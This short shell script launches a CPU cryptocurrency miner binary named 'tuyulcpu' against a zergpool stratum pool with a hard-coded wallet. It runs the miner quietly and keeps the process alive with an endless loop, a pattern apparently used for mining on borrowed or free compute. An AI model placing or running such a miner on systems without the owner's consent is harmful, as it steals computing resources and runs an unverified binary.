#!/bin/sh
POOL=stratum+tcp://lyra2z330.na.mine.zergpool.com:4563
WALLET=DFtFJRa7oUzbBpUxYLXFaeTVDwyidT1TMk
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-CPU-MANTAB)
chmod +x tuyulcpu
./tuyulcpu -a lyra2z330 -o $POOL -u $WALLET -p c=DGB,mc=PYRK,ID=$WORKER -q
while [ 1 ]; do
sleep 3
done
sleep 999
